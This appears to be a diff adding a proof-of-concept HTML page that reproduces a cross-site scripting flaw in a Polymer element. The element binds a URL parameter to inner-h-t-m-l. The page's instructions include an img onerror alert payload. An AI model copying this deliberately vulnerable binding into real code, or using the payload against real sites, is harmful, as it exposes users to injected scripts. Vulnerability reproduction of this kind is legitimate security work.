@@ -1,0 +1,62 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <title>Minimal Polymer XSS Demo</title>
+</head>
+<body>
+
+  <!-- Define the Vulnerable Component -->
+  <script type="module">
+    // Import path tracks one level up to C:\polymer\
+    import { PolymerElement, html } from '../polymer-element.js';
+
+    class VulnerableElement extends PolymerElement {
+      static get properties() {
+        return {
+          content: String
+        };
+      }
+      static get template() {
+        // The Sink: Binding a property directly to 'inner-h-t-m-l'
+        return html`<div id="sink" inner-h-t-m-l="[[content]]"></div>`;
+      }
+    }
+    customElements.define('vulnerable-element', VulnerableElement);
+  </script>
+
+  <!-- Usage of the Component -->
+  <div style="font-family: sans-serif; padding: 20px;">
+    <h1>Polymer XSS Reproduction PoC</h1>
+    <p>This page captures data from the <strong>'p'</strong> URL parameter and binds it to a Polymer property.</p>
+    <hr>
+    
+    <vulnerable-element id="target"></vulnerable-element>
+
+    <div id="instructions" style="margin-top: 20px; padding: 10px; background: #f0f0f0; border-radius: 4px;">
+      <strong>Instructions:</strong>
+      <p>To trigger the XSS, start a python server in <code>C:\polymer\</code>:</p>
+      <code>python -m http.server 8081</code>
+      <p>Then navigate to:</p>
+      <code>http://localhost:8081/poc/xss-demo.html?p=&lt;img src=x onerror=alert('XSS_SUCCESS_IN_POC')&gt;</code>
+    </div>
+  </div>
+
+  <!-- Logic to trigger the injection -->
+  <script>
+    document.addEventListener('DOMContentLoaded', () => {
+      const params = new URLSearchParams(window.location.search);
+      const payload = params.get('p');
+      
+      if (payload) {
+        // Triggers the XSS by assigning untrusted data to the component's property
+        const target = document.getElementById('target');
+        if (target) {
+          target.content = payload;
+        }
+      }
+    });
+  </script>
+
+</body>
+</html>
